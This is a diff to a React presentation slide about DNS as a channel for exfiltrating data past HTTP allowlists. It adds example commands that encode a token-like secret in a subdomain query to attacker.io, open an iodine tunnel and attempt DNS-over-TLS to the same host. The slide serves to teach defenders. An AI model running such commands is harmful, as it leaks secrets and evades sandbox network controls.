@@ -1,6 +1,6 @@
 export default function Slide17DnsExfiltration() {
   return (
-    <div className="slide" style={{ display: 'flex', flexDirection: 'column' }}>
+    <div className="slide" style={{ display: 'flex', flexDirection: 'column', fontSize: '1.26em' }}>
       <h2>🕵️ DNS: The Exfiltration Channel</h2>
       <p className="lede">HTTP allowlists don't constrain DNS. DNS is not HTTP.</p>
 
@@ -9,9 +9,17 @@ export default function Slide17DnsExfiltration() {
           <h3>What exfiltration looks like</h3>
           <ul>
             <li>Encode secrets as subdomain labels and query attacker-controlled zones</li>
-            <li>Use high-volume tunneling tools such as <code>iodine</code></li>
+            <li>Route all traffic as DNS queries to bypass the sandbox entirely (<code>iodine</code>)</li>
             <li>Try encrypted DNS on port <code>853</code> to bypass HTTP controls</li>
           </ul>
+          <pre style={{ marginTop: '0.6em', fontSize: '0.75em' }}><code>{`# secret encoded in subdomain
+dig GHPAT_abc123XYZ.exfil.attacker.io
+
+# iodine DNS tunnel
+iodine -f attacker.io
+
+# DNS-over-TLS bypass attempt
+dig @attacker.io +tls secret.attacker.io`}</code></pre>
         </div>
 
         <div className="dns-box good">
